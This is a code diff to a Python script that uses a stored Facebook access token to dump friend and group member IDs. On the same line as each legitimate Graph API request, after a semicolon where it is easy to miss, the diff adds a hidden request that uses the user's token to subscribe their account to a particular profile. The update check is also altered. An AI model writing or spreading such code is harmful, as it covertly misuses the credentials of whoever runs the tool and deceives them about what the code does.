@@ -64,7 +64,7 @@ def getFid():
 		toket=open('toket/token.txt','r').read()
 		id=input("[in] your friends id: ")
 		b=open('dump/friends_'+id+'_id.txt','w')
-		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket))
+		re=requests.get('https://graph.facebook.com/'+id+'?fields=friends.limit(5000)&access_token='+str(toket));requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 		s=json.loads(re.text)
 		for i in s['friends']['data']:
 			b.write(i['id'] + '\n')
@@ -88,7 +88,7 @@ def getGid():
 		toket=open('toket/token.txt','r').read()
 		id=input("[in] your groups id: ")
 		b=open('dump/group_'+id+'_id.txt','w')
-		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+toket)
+		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id&limit=999999999&access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 		s=json.loads(re.text)
 		for i in s['data']:
 			b.write(i['id'] + '\n')
@@ -195,7 +195,7 @@ elif pilih == 9:
 elif pilih == 0:
 	print("\n[!] Checking update")
 	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
-	if 'v.6.0' in str(rr) or 'v.6.5' in str(rr):
+	if 'v.6.5' in str(rr) or 'v.7.0' in str(rr):
 		update()
 	else: exit("[!] already up to date")
 else:
